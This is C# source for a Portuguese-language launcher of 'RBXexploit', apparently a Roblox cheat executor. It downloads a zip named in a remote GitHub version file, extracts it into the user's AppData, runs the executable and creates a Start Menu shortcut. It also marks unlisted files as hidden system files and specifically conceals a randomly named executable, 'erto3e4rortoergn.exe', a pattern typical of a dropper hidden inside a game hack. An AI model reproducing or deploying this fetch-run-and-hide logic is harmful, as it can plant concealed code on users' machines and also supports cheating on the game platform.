using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using System.Collections.Generic;
using WindowsShortcutFactory;
using IOFile = System.IO.File;

namespace RBXLauncher
{
    class Program
    {
        private const string VersionJsonUrl = "https://raw.githubusercontent.com/breathingoutbiddingcontest484/RBX/refs/heads/main/version.json";

        private static readonly string AppDataFolder = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "RBXexploit");

        private static readonly string LocalVersionFile = Path.Combine(AppDataFolder, "version.txt");

        private static readonly string StartMenuPrograms = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.StartMenu),
            "Programs");

        static async Task Main(string[] args)
        {
            Console.OutputEncoding = System.Text.Encoding.UTF8;
            
            // Mostra o título gigante
            DisplayTitle();
            
            LogInfo("Iniciando...");

            if (!await CheckInternetConnectionAsync())
            {
                LogError("Sem conexão com a internet. O launcher será encerrado.");
                Console.ReadKey();
                return;
            }

            try
            {
                LogInfo("Verificando atualizações...");
                var onlineInfo = await GetOnlineVersionInfoAsync();
                if (onlineInfo == null)
                {
                    LogError("Não foi possível obter informações da versão online.");
                    Console.ReadKey();
                    return;
                }

                string? localVersion = null;
                if (IOFile.Exists(LocalVersionFile))
                {
                    localVersion = IOFile.ReadAllText(LocalVersionFile).Trim();
                }

                bool precisaAtualizar = localVersion == null || localVersion != onlineInfo.Version;

                if (!precisaAtualizar)
                {
                    LogSuccess("Você já está na versão mais recente.");
                    await Task.Delay(2000);
                }
                else
                {
                    if (localVersion != null)
                        LogInfo($"Nova versão disponível: {onlineInfo.Version} (atual: {localVersion})");
                    else
                        LogInfo("Nenhuma instalação local encontrada. Iniciando download.");

                    // Exibe o changelog
                    if (onlineInfo.Changelog != null && onlineInfo.Changelog.Count > 0)
                    {
                        Console.WriteLine();
                        LogSection("CHANGELOG");
                        foreach (var change in onlineInfo.Changelog)
                        {
                            LogChangeLog($"  {change}");
                        }
                        Console.WriteLine();
                    }

                    LogInfo("Iniciando instalação... por favor aguarde...");

                    string tempZip = Path.Combine(Path.GetTempPath(), "RBXexploit.zip");
                    await DownloadFileAsync(onlineInfo.DownloadUrl, tempZip);

                    if (Directory.Exists(AppDataFolder))
                    {
                        RemoveReadOnlyAndSystemAttributes(AppDataFolder);
                    }
                    else
                    {
                        Directory.CreateDirectory(AppDataFolder);
                    }

                    ZipFile.ExtractToDirectory(tempZip, AppDataFolder, overwriteFiles: true);
                    IOFile.Delete(tempZip);

                    HideNonWhitelistedFiles(AppDataFolder);

                    LogSuccess("Instalação Concluída com Sucesso!");
                    await Task.Delay(1500);
                }

                CreateStartMenuShortcut();

                LogInfo("Iniciando RBXexploit...");
                await Task.Delay(1500);

                string exePath = Path.Combine(AppDataFolder, "RBXexploit.exe");
                if (IOFile.Exists(exePath))
                {
                    System.Diagnostics.Process.Start(exePath);
                }
                else
                {
                    LogError("RBXexploit.exe não encontrado na instalação.");
                    Console.ReadKey();
                }
            }
            catch (Exception ex)
            {
                LogError($"{ex.Message}");
                Console.ReadKey();
            }
        }

        static void DisplayTitle()
        {
            Console.Clear();
            
            string[] titleArt = new string[]
            {
                "   ██████╗ ██████╗ ██╗  ██╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
                "   ██╔══██╗██╔══██╗╚██╗██╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
                "   ██████╔╝██████╔╝ ╚███╔╝     █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
                "   ██╔══██╗██╔══██╗ ██╔██╗     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
                "   ██║  ██║██████╔╝██╔╝ ██╗    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
                "   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ",
            };

            Console.ForegroundColor = ConsoleColor.Cyan;
            foreach (var line in titleArt)
            {
                Console.WriteLine(line);
            }
            Console.ResetColor();
            
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("╔════════════════════════════════════════════════════════════════════════════════════╗");
            Console.ResetColor();
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("║                        LAUNCHER OFICIAL - v1.0                                      ║");
            Console.ResetColor();
            
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("╚════════════════════════════════════════════════════════════════════════════════════╝");
            Console.ResetColor();
            
            Console.WriteLine();
        }

        static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[ INFO ] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ ERRO ] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[ OK ] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[ AVISO ] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void LogSection(string section)
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine($"╔═══ {section} ═══╗");
            Console.ResetColor();
        }

        static void LogChangeLog(string change)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(change);
            Console.ResetColor();
        }

        static void LogDownload(string message)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write(message);
            Console.ResetColor();
        }

        static async Task<bool> CheckInternetConnectionAsync()
        {
            try
            {
                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(5);
                var response = await client.GetAsync("https://www.google.com");
                return response.IsSuccessStatusCode;
            }
            catch
            {
                return false;
            }
        }

        static async Task<VersionInfo?> GetOnlineVersionInfoAsync()
        {
            try
            {
                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(15);
                client.DefaultRequestHeaders.Add("User-Agent", "RBXLauncher/1.0");

                LogInfo("Baixando informações de versão...");
                string json = await client.GetStringAsync(VersionJsonUrl);

                var info = VersionInfo.FromJson(json);
                if (info != null)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[ OK ] Versão online detectada: {info.Version}");
                    Console.ResetColor();
                    return info;
                }
                else
                {
                    LogError("O arquivo de versão online está em formato inválido.");
                    return null;
                }
            }
            catch (HttpRequestException ex)
            {
                LogError($"Falha na requisição: {ex.Message}");
                if (ex.InnerException != null)
                    LogError($"Detalhes: {ex.InnerException.Message}");
                return null;
            }
            catch (TaskCanceledException)
            {
                LogError("A conexão com o servidor de atualização excedeu o tempo limite.");
                return null;
            }
            catch (Exception ex)
            {
                LogError($"Erro geral: {ex.Message}");
                return null;
            }
        }

        static async Task DownloadFileAsync(string url, string destinationPath)
        {
            using var client = new HttpClient();
            using var response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
            response.EnsureSuccessStatusCode();
            long? totalBytes = response.Content.Headers.ContentLength;

            using var fileStream = new FileStream(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None);
            using var downloadStream = await response.Content.ReadAsStreamAsync();

            byte[] buffer = new byte[8192];
            long totalDownloaded = 0;
            int bytesRead;

            while ((bytesRead = await downloadStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                await fileStream.WriteAsync(buffer, 0, bytesRead);
                totalDownloaded += bytesRead;

                if (totalBytes.HasValue)
                {
                    double progress = (double)totalDownloaded / totalBytes.Value * 100;
                    Console.Write($"\r");
                    LogDownload($"[ DOWNLOAD ] {progress:F0}% concluído...");
                }
            }
            Console.WriteLine();
        }

        static void RemoveReadOnlyAndSystemAttributes(string directoryPath)
        {
            if (!Directory.Exists(directoryPath)) return;

            foreach (string file in Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories))
            {
                FileAttributes attr = IOFile.GetAttributes(file);
                if ((attr & (FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System)) != 0)
                {
                    attr &= ~(FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
                    IOFile.SetAttributes(file, attr);
                }
            }

            foreach (string dir in Directory.GetDirectories(directoryPath, "*", SearchOption.AllDirectories))
            {
                FileAttributes attr = IOFile.GetAttributes(dir);
                if ((attr & (FileAttributes.Hidden | FileAttributes.System)) != 0)
                {
                    attr &= ~(FileAttributes.Hidden | FileAttributes.System);
                    IOFile.SetAttributes(dir, attr | FileAttributes.Directory);
                }
            }
        }

        static void HideNonWhitelistedFiles(string directoryPath)
        {
            string[] whitelist = { "RBXexploit.exe", "RBXCore.dll", "Workspace", "Scripts", "AutoExec", "Bin", "version.txt" };

            foreach (string file in Directory.GetFiles(directoryPath))
            {
                string fileName = Path.GetFileName(file);
                if (!whitelist.Contains(fileName, StringComparer.OrdinalIgnoreCase))
                {
                    IOFile.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System);
                }
                else
                {
                    IOFile.SetAttributes(file, FileAttributes.Normal);
                }
            }

            foreach (string dir in Directory.GetDirectories(directoryPath))
            {
                string dirName = Path.GetFileName(dir);
                if (!whitelist.Contains(dirName, StringComparer.OrdinalIgnoreCase))
                {
                    IOFile.SetAttributes(dir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
                }
                else
                {
                    IOFile.SetAttributes(dir, FileAttributes.Directory);
                }
            }

            string hiddenFile = Path.Combine(directoryPath, "Bin", "erto3e4rortoergn.exe");
            if (IOFile.Exists(hiddenFile))
                IOFile.SetAttributes(hiddenFile, FileAttributes.Hidden | FileAttributes.System);
        }

        static void CreateStartMenuShortcut()
        {
            try
            {
                string shortcutFolder = Path.Combine(StartMenuPrograms, "RBXexploit");
                if (!Directory.Exists(shortcutFolder))
                    Directory.CreateDirectory(shortcutFolder);

                string shortcutPath = Path.Combine(shortcutFolder, "RBXexploit.lnk");
                string targetExe = Path.Combine(AppDataFolder, "RBXexploit.exe");

                if (!IOFile.Exists(targetExe))
                {
                    LogWarning("RBXexploit.exe não encontrado para criar atalho.");
                    return;
                }

                using var shortcut = new WindowsShortcut();
                shortcut.Path = targetExe;
                shortcut.WorkingDirectory = AppDataFolder;
                shortcut.Description = "RBXexploit - Executor Roblox";
                shortcut.Save(shortcutPath);

                LogSuccess("Atalho atualizado no Menu Iniciar.");
            }
            catch (Exception ex)
            {
                LogError($"Não foi possível criar atalho no Menu Iniciar: {ex.Message}");
            }
        }
    }

    public class VersionInfo
    {
        public string Version { get; set; } = string.Empty;
        public string DownloadUrl { get; set; } = string.Empty;
        public List<string> Changelog { get; set; } = new List<string>();

        public static VersionInfo? FromJson(string json)
        {
            try
            {
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;

                var info = new VersionInfo();

                if (TryGetPropertyCaseInsensitive(root, "version", out var versionProp))
                    info.Version = versionProp.GetString() ?? "";
                else
                    return null;

                if (TryGetPropertyCaseInsensitive(root, "url", out var urlProp))
                    info.DownloadUrl = urlProp.GetString() ?? "";
                else if (TryGetPropertyCaseInsensitive(root, "download_url", out urlProp))
                    info.DownloadUrl = urlProp.GetString() ?? "";
                else if (TryGetPropertyCaseInsensitive(root, "downloadUrl", out urlProp))
                    info.DownloadUrl = urlProp.GetString() ?? "";

                if (TryGetPropertyCaseInsensitive(root, "changelog", out var changelogProp))
                {
                    if (changelogProp.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var item in changelogProp.EnumerateArray())
                        {
                            if (item.ValueKind == JsonValueKind.String)
                            {
                                var changeItem = item.GetString();
                                if (!string.IsNullOrEmpty(changeItem))
                                    info.Changelog.Add(changeItem);
                            }
                        }
                    }
                }

                if (string.IsNullOrEmpty(info.Version))
                    return null;

                return info;
            }
            catch
            {
                return null;
            }
        }

        private static bool TryGetPropertyCaseInsensitive(JsonElement element, string propertyName, out JsonElement value)
        {
            foreach (var prop in element.EnumerateObject())
            {
                if (string.Equals(prop.Name, propertyName, StringComparison.OrdinalIgnoreCase))
                {
                    value = prop.Value;
                    return true;
                }
            }
            value = default;
            return false;
        }
    }
}
